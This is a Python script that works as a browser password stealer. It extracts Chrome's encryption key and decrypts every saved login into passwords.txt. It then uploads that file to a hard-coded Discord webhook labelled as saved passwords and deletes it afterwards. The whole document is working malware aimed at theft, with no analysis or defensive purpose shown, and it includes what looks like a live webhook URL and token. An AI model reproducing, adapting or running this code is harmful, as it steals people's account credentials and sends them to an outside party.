def chrome_date_and_time(chrome_data):

    # Chrome_data format is 
    # year-month-date hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    
    # Local_computer_directory_path will
    # look like this below
    # C: => Users => <Your_Name> => AppData => 
    # Local => Google => Chrome => User Data => 
    # Local State
    
    local_computer_directory_path = os.path.join(
    os.environ["USERPROFILE"], "AppData", "Local", "Google",
    "Chrome", "User Data", "Local State")
                                                 
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
    local_state_data["os_crypt"]["encrypted_key"])
    
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
    
    # return decrypted key
    return win32crypt.CryptUnprotectData(
    encryption_key, None, None, None, 0)[1]
    
def password_decryption(password, encryption_key):

    try:
        iv = password[3:15]
        password = password[15:]
        
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
        
        
        
        
        
        
        
        
        
        
        
import os 
import json 
import base64 
import sqlite3 
import win32crypt 
from Crypto.Cipher import AES
import shutil 
from datetime import datetime, timedelta

def chrome_date_and_time(chrome_data): 
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key(): 
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = json.load(f)

    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
    encryption_key = encryption_key[5:] 
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def password_decryption(password, encryption_key): 
    try: 
        iv = password[3:15] 
        password = password[15:] 
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"

def main(): 
    key = fetching_encryption_key() 
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", 
                           "Google", "Chrome", "User Data", "default", "Login Data") 
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename) 

    with sqlite3.connect(filename) as db:
        cursor = db.cursor() 
        cursor.execute( 
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used") 
        
        with open("passwords.txt", "w", encoding="utf-8") as f:
            for row in cursor.fetchall(): 
                main_url, login_page_url, user_name, encrypted_password, date_of_creation, last_usuage = row
                decrypted_password = password_decryption(encrypted_password, key)
                
                if user_name or decrypted_password: 
                    f.write(f"Main URL: {main_url}\n") 
                    f.write(f"Login URL: {login_page_url}\n") 
                    f.write(f"User name: {user_name}\n") 
                    f.write(f"Decrypted Password: {decrypted_password}\n") 
                
                if date_of_creation != 86400000000 and date_of_creation: 
                    f.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n") 
                
                if last_usuage != 86400000000 and last_usuage: 
                    f.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n") 
                f.write("=" * 100 + "\n")

    try: 
        os.remove(filename) 
    except: 
        pass

if __name__ == "__main__": 
    main()


import requests

# Webhook URL (استبدل بالـ Webhook الخاص بك)
webhook_url = "https://discordapp.com/api/webhooks/1320037579181264988/FsiutUo5qbCzj5EEoef7qmEsjr4H4P7GIx-RW2nZGHfEGwaS83urKHvskmQCl91v43fx"

# افتح الملف الذي تريد رفعه
with open("passwords.txt", "rb") as file:
    # إعداد البيانات لإرسالها عبر Webhook
    files = {
        "file": ("passwords.txt", file, "text/plain")  # اسم الملف، محتوى الملف، نوع MIME
    }
    data = {
        "content": "Here is the file with saved passwords:"  # النص الذي سيظهر مع الملف
    }

    # إرسال البيانات إلى Webhook
    response = requests.post(webhook_url, data=data, files=files)

# تحقق من نجاح الطلب
if response.status_code == 204:
    print("File sent successfully!")
else:
    print(f"Failed to send the file: {response.status_code}")

    
    
    
    
    
    
    
    
    


# اسم الملف الذي تريد حذفه
file_name = 'passwords.txt'  # استبدل هذا باسم الملف الفعلي

try:
    os.remove(file_name)
    print(f"تم حذف الملف: {codeblock}")
except FileNotFoundError:
    print(f"الملف غير موجود: {codeblock}")
except PermissionError:
    print(f"ليس لديك إذن لحذف هذا الملف: {codeblock}")
except Exception as e:
    print(f"حدث خطأ: {e}")

